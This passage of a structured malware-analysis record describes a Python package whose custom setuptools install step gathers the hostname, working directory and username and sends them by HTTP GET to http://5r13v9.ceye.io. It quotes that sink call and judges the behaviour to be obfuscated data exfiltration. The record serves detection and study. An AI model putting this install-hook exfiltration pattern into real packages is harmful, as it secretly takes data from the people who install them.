  "purpose": "Customize the installation process by collecting system information and sending it to an external server during package installation.",
  "sources": "socket.gethostname(), os.getcwd(), getpass.getuser()",
  "sinks": "requests.get('http://5r13v9.ceye.io', params=...)",
  "flows": "System information (hostname, cwd, username) collected from sources and sent via HTTP GET request to external server",
  "anomalies": "Obfuscated class and method names, unusual naming conventions, sending data to a suspicious domain, code execution during installation rather than runtime, use of a seemingly random domain",
  "analysis": "The code defines a custom install class inheriting from setuptools's install, overriding the installation method to collect hostname, current working directory, and username, then send this information via a GET request to an external domain (http://5r13v9.ceye.io). The obfuscated class and method names suggest an attempt to conceal malicious activity. Data collection occurs during package installation, which is unusual and suspicious. The external domain looks suspicious and may be used for malicious data exfiltration or command-and-control purposes. There are no other functions or logic; the code's intent appears to be to surreptitiously gather and transmit user/system data.",
  "conclusion": "The code exhibits malicious behavior by collecting system information during package installation and sending it to an external server under obfuscated names, indicating possible malicious intent and data exfiltration. The obfuscation and timing raise significant security concerns.",
